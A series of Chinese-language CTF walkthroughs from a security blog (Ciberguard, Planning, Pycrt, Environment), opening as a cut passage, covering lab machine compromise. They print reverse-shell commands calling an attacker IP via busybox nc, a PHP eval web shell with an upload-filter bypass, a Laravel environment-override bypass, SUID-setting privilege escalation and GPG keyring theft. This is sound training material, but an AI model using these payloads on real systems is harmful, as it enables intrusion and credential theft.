os.path.basename(LINK)\rLINK_TARGET = os.readlink(LINK)\rif \u0026#39;etc\u0026#39; in LINK_TARGET or \u0026#39;root\u0026#39; in LINK_TARGET:\rprint(f\u0026#34;¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!\u0026#34;)\ros.unlink(LINK)\relse:\rprint(f\u0026#34;Enlace encontrado [{LINK}], moviéndolo a cuarentena.\u0026#34;)\rshutil.move(LINK, os.path.join(QUAR_DIR, LINK_NAME))\rif os.path.exists(os.path.join(QUAR_DIR, LINK_NAME)):\rprint(\u0026#34;Contenido:\u0026#34;)\rwith open(os.path.join(QUAR_DIR, LINK_NAME), \u0026#39;r\u0026#39;) as f:\rprint(f.read())\relse:\rprint(f\u0026#34;El enlace [{LINK}] no es un enlace simbólico.\u0026#34;) 大概就是如果你能控制传入的 .jpg 符号链接指向你想读的文件（不在 /etc 或 /root 里），可以利用它来间接读取文件内容。\n例如👇\npablo@6e97f12b7ffe:/tmp$ echo 1231231 \u0026gt; aaaa\rpablo@6e97f12b7ffe:/tmp$ ln -s /tmp/aaaa fake.jpg\rpablo@6e97f12b7ffe:/tmp$ sudo /usr/bin/python3 /opt/nllns/clean_symlink.py /tmp/fake.jpg Enlace encontrado [/tmp/fake.jpg], moviéndolo a cuarentena.\rContenido:\r1231231 但是呢也只能读取到非重要文件，\n将目光放到/tmp目录下，有一个id_rsa目录，虽然拥有者是pablo\npablo@6e97f12b7ffe:/tmp$ ls -al\rtotal 28\rdrwxrwxrwt 1 root root 4096 May 13 09:59 .\rdrwxr-xr-x 1 root root 4096 May 13 09:07 ..\rdrwxrwxrwx 1 root root 4096 Apr 17 17:14 hora\r-rw------- 1 pablo pablo 3381 May 2 16:58 id_rsa 但是刚好可以用它来登录到root\npablo@6e97f12b7ffe:/tmp$ ssh -i id_rsa root@127.0.0.1\rWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.13-amd64 x86_64)\r* Documentation: https://help.ubuntu.com\r* Management: https://landscape.canonical.com\r* Support: https://ubuntu.com/pro\rThis system has been minimized by removing packages and content that are\rnot required on a system that users do not log into.\rTo restore this content, you can run the \u0026#39;unminimize\u0026#39; command.\rLast login: Tue May 13 09:52:11 2025 from 127.0.0.1\rroot@6e97f12b7ffe:~# id\ruid=0(root) gid=0(root) groups=0(root)\rroot@6e97f12b7ffe:~# Summary #\r总体来说没什么难度，最后的部分让我想起了这个机器：HTB-LinkVortex - HYH\n他最后也有一个软链接提权， 可以通过二级链接绕过，在本机器上就无法完成。\n","date":"2025-05-13","externalUrl":null,"permalink":"/posts/2025/05/dockerlabs-ciberguard/","section":"Posts","summary":"","title":"Dockerlabs-Ciberguard","type":"posts"},{"content":"","date":"2025-05-12","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":"","date":"2025-05-12","externalUrl":null,"permalink":"/categories/htb-machine/","section":"Categories","summary":"","title":"HTB-Machine","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Easy As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r\nNmap #\r[root@kali] /home/kali/Planning ❯ nmap planning.htb -sV -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA) |_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-server-header: nginx/1.24.0 (Ubuntu) |_http-title: Edukate - Online Education Website 80端口没有什么可以利用的东西，尝试爆破子域名\nSubdomain Fuzz #\r[root@kali] /home/kali/Planning ❯ ffuf -u http://planning.htb/ -w /usr/share/fuzzDicts/subdomainDicts/main.txt -H \u0026#34;Host:FUZZ.planning.htb\u0026#34; -fs 178 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://planning.htb/ :: Wordlist : FUZZ: /usr/share/fuzzDicts/subdomainDicts/main.txt :: Header : Host: FUZZ.planning.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ grafana [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 98ms] 添加grafana.planning.htb到/etc/hosts\nCVE-2024-9264 #\r经过搜索我找到了一个可以拿到shell的cve\nz3k0sec/CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264) 当前应该是在docker环境中，需要逃逸出去\n查看一下env环境变量\nGF_SECURITY_ADMIN_PASSWORD=RioTecRXXXXXXXXXXXXXXX GF_SECURITY_ADMIN_USER=enzo 可以直接登录ssh\nRoot #\r找到一个json文件\n❯ cat crontab.db| jq { \u0026#34;name\u0026#34;: \u0026#34;Grafana backup\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar \u0026amp;\u0026amp; /usr/bin/gzip /var/backups/grafana.tar \u0026amp;\u0026amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \u0026amp;\u0026amp; rm /var/backups/grafana.tar.gz\u0026#34;, \u0026#34;schedule\u0026#34;: \u0026#34;@daily\u0026#34;, \u0026#34;stopped\u0026#34;: false, \u0026#34;timestamp\u0026#34;: \u0026#34;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\u0026#34;, \u0026#34;logging\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;mailing\u0026#34;: {}, \u0026#34;created\u0026#34;: 1740774983276, \u0026#34;saved\u0026#34;: false, \u0026#34;_id\u0026#34;: \u0026#34;GTI22PpoJNtRKg0W\u0026#34; } { \u0026#34;name\u0026#34;: \u0026#34;Cleanup\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;/root/scripts/cleanup.sh\u0026#34;, \u0026#34;schedule\u0026#34;: \u0026#34;* * * * *\u0026#34;, \u0026#34;stopped\u0026#34;: false, \u0026#34;timestamp\u0026#34;: \u0026#34;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\u0026#34;, \u0026#34;logging\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;mailing\u0026#34;: {}, \u0026#34;created\u0026#34;: 1740849309992, \u0026#34;saved\u0026#34;: false, \u0026#34;_id\u0026#34;: \u0026#34;gNIRXh1WIc9K7BYX\u0026#34; } 里面有一个密码：P4ssw0rdS0pRi0T3c，但不是root的密码\n没有找到能用的东西，查看一下端口开放情况\nenzo@planning:~$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.54:53 0.0.0.0:* udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:37121 0.0.0.0:* tcp LISTEN 0 70 127.0.0.1:33060 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.54:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:8000 0.0.0.0:* tcp LISTEN 0 4096 *:22 *:* 注意到开放了一个8000端口，将其转发出来\n[root@kali] /home/kali/Planning ❯ ssh enzo@planning.htb -L 8000:127.0.0.1:8000 尝试了一下，可以直接这样登录👇\n实际上就是一个定时任务的web控制端\n可以直接写入设置SUID的命令\n运行之后即可看到成功提权\nSummary #\rUser: 子域名爆破，用已知的用户名和密码登录到后台，通过CVE拿到docker容器的shell，在环境变量中拿到enzo的登录密码。\nRoot: 在/opt/crontabs目录下拿到一个密码，内网8000端口转发出去可以用于web登录，设置定时任务设置bash的SUID。\n","date":"2025-05-12","externalUrl":null,"permalink":"/posts/2025/05/htb-planning/","section":"Posts","summary":"","title":"HTB-Planning","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/pycrt ❯ nmap 192.168.55.36 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\r| ssh-hostkey: | 3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\r| 256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\r|_ 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian)\r6667/tcp open irc\r| irc-info: | users: 1\r| servers: 1\r| chans: 0\r| lusers: 1\r| lservers: 0\r| server: irc.local\r| version: InspIRCd-3. irc.local | source ident: nmap\r| source host: 192.168.55.4\r|_ error: Closing link: (nmap@192.168.55.4) [Client exited] 80端口没有可以利用的信息，只是一个静态页面\nIrssi #\r这里我使用的是irssi来进行irc连接，当然也可以使用weechat\n2024年8个最佳Linux IRC客户端整理 - 神算ID - 博客园 [(status)] /connect 192.168.55.36 6667 欢迎信息中提到了一个ShadowSec目录，并且能够访问\nFeroxbuster #\r[root@kali] /home/kali/pycrt ❯ feroxbuster -u \u0026#39;http://192.168.55.36/ShadowSec/\u0026#39; -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x php,txt\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.36/ShadowSec/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [php, txt]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 185l 509w 6270c http://192.168.55.36/ShadowSec/\r200 GET 1l 4w 21c http://192.168.55.36/ShadowSec/bydataset.php\r[####################] - 9m 3555720/3555720 0s found:2 errors:0 [####################] - 9m 3555720/3555720 6573/s http://192.168.55.36/ShadowSec/ 找到一个bydataset.php，并没有什么东西\n[root@kali] /home/kali ❯ curl http://192.168.55.36/ShadowSec/bydataset.php Nothing to see here. FFUF #\r[root@kali] /home/kali ❯ ffuf -u \u0026#39;http://192.168.55.36/ShadowSec/bydataset.php?FUZZ=../../.././../../etc/passwd\u0026#39; -w /usr/share/fuzzDicts/paramDict/AllParam.txt -fs 21\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.55.36/ShadowSec/bydataset.php?FUZZ=../../.././../../etc/passwd\r:: Wordlist : FUZZ: /usr/share/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 21\r________________________________________________\rfile [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 2ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 5555 req/sec :: Duration: [0:00:13] :: Errors: 0 :: 存在文件包含漏洞\n[root@kali] /home/kali ❯ curl \u0026#34;http://192.168.55.36/ShadowSec/bydataset.php?file=/etc/passwd\u0026#34;\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rpycrtlake:x:1000:1000:pycrtlake,,,:/home/pycrtlake:/bin/bash\rsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\rmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\rsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\rchatlake:x:1001:1001::/home/chatlake:/bin/sh Own www-data #\r查看一下bydataset.php的源码呢\n[root@kali] /home/kali ❯ curl \u0026#34;http://192.168.55.36/ShadowSec/bydataset.php?file=php://filter/convert.base64-encode/resource=bydataset.php\u0026#34; | base64 -d\r% Total % Received % Xferd Average Speed Time Time Time Current\rDload Upload Total Spent Left Speed\r100 1736 100 1736 0 0 947k 0 --:--:-- --:--:-- --:--:-- 1695k\r\u0026lt;?php\rfunction decrypt($input) {\r$reversed = strrev($input);\recho \u0026#34;Reversed: \u0026#34; . $reversed . \u0026#34;\\n\u0026#34;;\r$decoded = base64_decode($reversed);\recho \u0026#34;Decoded: \u0026#34; . $decoded . \u0026#34;\\n\u0026#34;;\rif ($decoded === false) {\recho \u0026#34;Base64 decoding failed.\\n\u0026#34;;\rreturn false;\r}\rif (strpos($decoded, \u0026#39;cmd:\u0026#39;) === 0) {\rreturn substr($decoded, 4);\r}\rreturn false;\r}\rif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;GET\u0026#39; \u0026amp;\u0026amp; isset($_GET[\u0026#39;file\u0026#39;])) {\r$file = $_GET[\u0026#39;file\u0026#39;];\rif (stripos($file, \u0026#39;phpinfo\u0026#39;) !== false) {\rexit(\u0026#39;Access Denied\u0026#39;);\r}\r$filterUrl = \u0026#39;php://filter/convert.base64-encode/resource=\u0026#39; . $file;\r$data = @file_get_contents($filterUrl);\rif ($data === false) {\rexit(\u0026#39;Failed to read file\u0026#39;);\r}\recho base64_decode($data);\rexit;\r} elseif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;auth\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;payload\u0026#39;])) {\r$auth = $_POST[\u0026#39;auth\u0026#39;];\r$payload = $_POST[\u0026#39;payload\u0026#39;];\rif ($auth !== \u0026#39;LetMeIn123!\u0026#39;) {\rexit(\u0026#39;Invalid Auth Token.\u0026#39;);\r}\r$command = decrypt($payload);\rif ($command !== false) {\r$output = exec($command);\recho \u0026#34;\u0026lt;pre\u0026gt;$output\u0026lt;/pre\u0026gt;\u0026#34;;\r} else {\recho \u0026#34;Payload decode failed.\\n\u0026#34;;\r}\rexit;\r} else {\recho \u0026#34;Nothing to see here.\u0026#34;;\r}\r?\u0026gt; 逻辑很简单，可以直接命令行请求\n[root@kali] /home/kali ❯ curl -X POST http://192.168.55.36/ShadowSec/bydataset.php \\\r-d \u0026#39;auth=LetMeIn123!\u0026#39; \\\r-d \u0026#34;payload=$(echo -n \u0026#39;cmd:id\u0026#39; | base64 | rev)\u0026#34;\rReversed: Y21kOmlk\rDecoded: cmd:id\r\u0026lt;pre\u0026gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)\u0026lt;/pre\u0026gt;# 获取反弹shell\n[root@kali] /home/kali/Desktop ❯ curl -X POST http://192.168.55.36/ShadowSec/bydataset.php \\\r-d \u0026#39;auth=LetMeIn123!\u0026#39; \\\r-d \u0026#34;payload=$(echo -n \u0026#39;cmd:busybox nc 192.168.55.4 4444 -e /bin/bash\u0026#39; | base64 | rev)\u0026#34; Own chatlake #\r查看sudo -l\nwww-data@PyCrt:/var/www/html/ShadowSec$ sudo -l\rMatching Defaults entries for www-data on PyCrt:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser www-data may run the following commands on PyCrt:\r(chatlake) NOPASSWD: /usr/bin/weecha 直接运行，发现存在exec命令执行的选项\n/exec id /exec busybox nc 192.168.55.4 8888 -e /bin/bash Own pycrtlake #\r查看sudo -l\nchatlake@PyCrt:~$ sudo -l\rMatching Defaults entries for chatlake on PyCrt:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser chatlake may run the following commands on PyCrt:\r(ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service 没有写入权限，执行之后，回到irssi连接，查看频道会多出来几个\n/list 进入到#chan6频道，过一会会有一个机器人信息\n看来需要切换ID，之前在/ShadowSec前端页面中存在一个ID为：ll104567\n/nick ll104567 在频道中发信息没有任何用，需要切到其他频道里面发信息，然后私聊admin会得到回显\n/query admin //私聊\r/q //退出私聊 这是我输入id:)的结果\n这是我输入123:)的结果\n看起来只能输入数字呢，经过尝试切换到#chan1才是有用的\n这是输入123:)的结果，似乎是映射到了特殊字符上\n经过验证，其中的逻辑就是ASCII码转换\n这是whoami的执行结果\n同样将busybox转码之后执行即可，但是这里两下就断了\n拼手速吧，再弹一个shell\nRoot #\r查看sudo -l\npycrtlake@PyCrt:/usr/local/bin$ sudo /usr/bin/gtkwave -f /root/root.txt Could not initialize GTK! Is DISPLAY env var/xhost set?\rUsage: /usr/bin/gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]\r-n, --nocli=DIRPATH use file requester for dumpfile name\r-f, --dump=FILE specify dumpfile name\r-F, --fastload generate/use VCD recoder fastload files\r-o, --optimize optimize VCD to FST\r-a, --save=FILE specify savefile name\r-A, --autosavename assume savefile is suffix modified dumpfile name\r-r, --rcfile=FILE specify override .rcfile name\r-d, --defaultskip if missing .rcfile, do not use useful defaults\r-D, --dualid=WHICH specify multisession identifier\r-l, --logfile=FILE specify simulation logfile name for time values\r-s, --start=TIME specify start time for LXT2/VZT block skip\r-e, --end=TIME specify end time for LXT2/VZT block skip\r-t, --stems=FILE specify stems file for source code annotation\r-c, --cpu=NUMCPUS specify number of CPUs for parallelizable ops\r-N, --nowm disable window manager for most windows\r-M, --nomenus do not render menubar (for making applets)\r-S, --script=FILE specify Tcl command script file for execution\r-T, --tcl_init=FILE specify Tcl command script file to be loaded on startup\r-W, --wish enable Tcl command line on stdio\r-R, --repscript=FILE specify timer-driven Tcl command script file\r-P, --repperiod=VALUE specify repscript period in msec (default: 500)\r-X, --xid=XID specify XID of window for GtkPlug to connect to\r-1, --rpcid=RPCID specify RPCID of GConf session\r-2, --chdir=DIR specify new current working directory\r-3, --restore restore previous session\r-4, --rcvar specify single rc variable values individually\r-5, --sstexclude specify sst exclusion filter filename\r-I, --interactive interactive VCD mode (filename is shared mem ID)\r-C, --comphier use compressed hierarchy names (slower)\r-g, --giga use gigabyte mempacking when recoding (slower)\r-L, --legacy use legacy VCD mode rather than the VCD recoder\r-v, --vcd use stdin as a VCD dumpfile\r-O, --output=FILE specify filename for stdout/stderr redirect\r-z, --slider-zoom enable horizontal slider stretch zoom\r-V, --version display version banner then exit\r-h, --help display this help then exit\r-x, --exit exit after loading trace (for loader benchmarks)\rVCD files and save files may be compressed with zip or gzip.\rGHW files may be compressed with gzip or bzip2.\rOther formats must remain uncompressed due to their non-linear access.\rNote that DUMPFILE is optional if the --dump or --nocli options are specified.\rSAVEFILE and RCFILE are always optional.\rReport bugs to \u0026lt;bybell@rocketmail.com\u0026gt;. 当前环境无 X 显示支持，该命令仍可能失败，需要伪造一下Xvfb，当前环境有Xvfb-run\n需要写入一个-S脚本\npycrtlake@PyCrt:~$ cat poc exec bash -c \u0026#34;chmod u+s /bin/bash\u0026#34; 然后通过xvfb运行即可\npycrtlake@PyCrt:~$ xvfb-run sudo /usr/bin/gtkwave -S ./poc GTKWave Analyzer v3.3.118 (w)1999-2023 BSI\rGTKWAVE | Use the -h, --help command line flags to display help.\r(gtkwave:801): dconf-WARNING **: 06:16:55.663: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)\rGTKWAVE | Executing Tcl script \u0026#39;./poc\u0026#39; Summary #\rUser: 连接irc服务器得到隐藏目录，fuzz一下参数可以进行文件包含，读出php源码。chatlake可以直接通过weechat的exec进行反弹。最后就是pycrtlake需要进入到频道里，通过ascii码进行命令执行。\nRoot: 参数存在-S引入脚本，直接写入恶意命令即可。\n","date":"2025-05-11","externalUrl":null,"permalink":"/posts/2025/05/hackmyvm-pycrt/","section":"Posts","summary":"","title":"HackMyVM-Pycrt","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Environment ❯ nmap Environment.htb -sV -A\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)\r|_ 256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)\r80/tcp open http nginx 1.22.1\r|_http-title: Save the Environment | environment.htb\r|_http-server-header: nginx/1.22.1 Dirsearch #\r[root@kali] /home/kali/Environment ❯ dirsearch -u http://environment.htb _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289\rTarget: http://environment.htb/\r[07:23:08] Scanning: [07:23:23] 403 - 555B - /admin/.config [07:23:23] 403 - 555B - /admin/.htaccess\r[07:23:39] 403 - 555B - /administrator/.htaccess [07:23:43] 403 - 555B - /admpar/.ftppass [07:23:43] 403 - 555B - /admrev/.ftppass\r[07:23:46] 403 - 555B - /app/.htaccess [07:23:52] 403 - 555B - /bitrix/.settings.bak [07:23:52] 403 - 555B - /bitrix/.settings\r[07:23:52] 403 - 555B - /bitrix/.settings.php.bak [07:23:54] 301 - 169B - /build -\u0026gt; http://environment.htb/build/ [07:23:54] 403 - 555B - /build/ [07:24:15] 403 - 555B - /ext/.deps [07:24:15] 200 - 0B - /favicon.ico [07:24:26] 200 - 4KB - /index.php [07:24:26] 200 - 2KB - /index.php/login/ [07:24:31] 403 - 555B - /lib/flex/varien/.project [07:24:31] 403 - 555B - /lib/flex/uploader/.actionScriptProperties\r[07:24:31] 403 - 555B - /lib/flex/varien/.flexLibProperties\r[07:24:31] 403 - 555B - /lib/flex/varien/.actionScriptProperties\r[07:24:31] 403 - 555B - /lib/flex/uploader/.flexProperties\r[07:24:31] 403 - 555B - /lib/flex/uploader/.project\r[07:24:31] 403 - 555B - /lib/flex/uploader/.settings\r[07:24:31] 403 - 555B - /lib/flex/varien/.settings\r[07:24:34] 200 - 2KB - /login [07:24:34] 200 - 2KB - /login/ [07:24:35] 302 - 358B - /logout/ -\u0026gt; http://environment.htb/login [07:24:35] 302 - 358B - /logout -\u0026gt; http://environment.htb/login [07:24:36] 403 - 555B - /mailer/.env [07:25:01] 403 - 555B - /resources/sass/.sass-cache/ [07:25:01] 403 - 555B - /resources/.arch-internal-preview.css\r[07:25:02] 200 - 24B - /robots.txt [07:25:12] 301 - 169B - /storage -\u0026gt; http://environment.htb/storage/ [07:25:12] 403 - 555B - /storage/\r[07:25:19] 403 - 555B - /twitter/.env [07:25:21] 405 - 244KB - /upload/ [07:25:22] 405 - 244KB - /upload [07:25:24] 403 - 555B - /vendor/ Task Completed Env Bypass #\r进入登录页，进行抓包，可以看到直接带出了报错信息\nPOST /login HTTP/1.1\rHost: environment.htb\r_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx\u0026amp;email=a%40a.c\u0026amp;password=123 并且这里注意一下逻辑，并没有写else的情况\nif($remember == \u0026#39;False\u0026#39;) {\r$keep_loggedin = False;\r} elseif ($remember == \u0026#39;True\u0026#39;) {\r$keep_loggedin = True;\r} 因此尝试给他随便赋一个值\nPOST /login HTTP/1.1\rHost: environment.htb\r_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx\u0026amp;email=a%40a.c\u0026amp;password=123\u0026amp;remember=111 这段代码的意思是在 Laravel 中，如果当前环境是 \u0026quot;preprod\u0026quot;（预生产环境），就自动登录为 user_id = 1 的用户，并跳转到管理后台页面。\n尝试搜索一下如何绕过👇\nEnvironment manipulation via query string in Laravel\nNyamort/CVE-2024-52301\n只需要传入GET参数即可绕过\nPOST /login?--env=preprod HTTP/1.1\rHost: environment.htb\r_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx\u0026amp;email=a%40a.c\u0026amp;password=123\u0026amp;remember=True File Upload #\r来到profile进行上传木马\n-----------------------------60487661513624885101007722530\rContent-Disposition: form-data; name=\u0026#34;upload\u0026#34;; filename=\u0026#34;shell.phtml\u0026#34;\rContent-Type: image/jpg\rGIF89a\r\u0026lt;?php eval($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\r-----------------------------60487661513624885101007722530-- 成功绕过👇\n但是呢，通过url访问只会把文件下载下来，这里需要在php后面再加一个点才能绕过\n-----------------------------168307501742120550952749914248\rContent-Disposition: form-data; name=\u0026#34;upload\u0026#34;; filename=\u0026#34;123.php.\u0026#34;\rContent-Type: image/jpg\rGIF89a\r\u0026lt;?php eval($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\r-----------------------------168307501742120550952749914248-- 可以直接读取到user.txt\nwww-data@environment:/home/hish$ ls -al\rtotal 36\rdrwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .\rdrwxr-xr-x 3 root root 4096 Jan 12 11:51 ..\rlrwxrwxrwx 1 root root 9 Apr 7 19:29 .bash_history -\u0026gt; /dev/null\r-rw-r--r-- 1 hish hish 220 Jan 6 21:28 .bash_logout\r-rw-r--r-- 1 hish hish 3526 Jan 12 14:42 .bashrc\rdrwxr-xr-x 4 hish hish 4096 May 7 21:48 .gnupg\rdrwxr-xr-x 3 hish hish 4096 Jan 6 21:43 .local\r-rw-r--r-- 1 hish hish 807 Jan 6 21:28 .profile\rdrwxr-xr-x 2 hish hish 4096 Jan 12 11:49 backup\r-rw-r--r-- 1 root hish 33 May 7 21:46 user.txt\rwww-data@environment:/home/hish$ cat user.txt 985363b5exxxxxxxxxxx Own hish #\r查看到backup目录里有一个gpg文件\nwww-data@environment:/home/hish/backup$ ls -al\rtotal 12\rdrwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .\rdrwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..\r-rw-r--r-- 1 hish hish 430 May 7 21:48 keyvault.gpg 由于当前www-data用户无法在/var/www目录下创建文件，因此指定目录\n# 1. 拷贝 hish 用户的密钥目录\rcp -r /home/hish/.gnupg /tmp/mygnupg\r# 2. 设置权限\rchmod -R 700 /tmp/mygnupg\r# 3. 确认是否存在私钥\rgpg --homedir /tmp/mygnupg --list-secret-keys\r# 4. 解密 keyvault.gpg\rgpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg 获取到message.txt，其中就有密码\nwww-data@environment:/tmp$ cat message.txt PAYPAL.COM -\u0026gt; Ihaves0meMon$yhere123\rENVIRONMENT.HTB -\u0026gt; marineSPm@ster!! // password !!!\rFACEBOOK.COM 